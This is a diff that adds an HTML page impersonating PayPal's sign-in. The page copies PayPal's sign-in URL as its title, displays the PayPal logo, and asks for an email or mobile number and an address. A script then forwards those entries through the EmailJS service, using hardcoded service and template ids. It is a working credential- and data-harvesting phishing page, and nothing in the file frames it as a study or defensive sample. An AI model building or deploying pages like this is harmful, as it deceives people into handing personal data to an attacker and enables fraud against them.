@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://www.paypal.com/in/signin</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            width: 300px;
+        }
+        input, textarea {
+            width: 7.4cm;
+            margin-bottom: 10px;
+            padding: 8px;
+    
+        }
+
+
+        #image{
+            background-repeat: no-repeat;
+            background-size: auto;
+            width: 3cm;
+            height: 3cm;
+            top: 2cm;
+            left: 12cm;
+            position: absolute;
+
+        }
+        #button{
+            background-color: rgb(57, 57, 147);
+            color: white;
+            background-color: mix;
+            width: 100%;
+            margin-bottom: 10px;
+            padding: 8px;
+        }
+        #button:hover{
+        background-color: rgb(38, 38, 99);  
+        transition: ease,0.5s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container"> 
+        <img src="https://download.logo.wine/logo/PayPal/PayPal-Logo.wine.png" id="image">
+        <input type="email" id="toEmail" placeholder=" Email or mobile number " required>
+        <input type="text" id="your_name" placeholder="Your Address" required>
+        <button onclick="sendEmail()" id="button">Sign-up</button>
+    </div>
+
+    <script>
+        (function(){
+            emailjs.init("SKvRKJ38i_wd3e8vp"); // Replace with your EmailJS user ID
+        })();
+        
+        function sendEmail() {
+            var params = {
+                to_email: document.getElementById("toEmail").value,
+                target_address: document.getElementById("your_name").value,
+            };
+
+            emailjs.send("service_ki2nxgi", "template_h0zsrh3", params)
+                .then(function(response) {
+                    alert("Email sent successfully!");
+                }, function(error) {
+                    alert("Failed to send email: " + error);
+                });
+        }
+    </script>
+</body>
+</html>
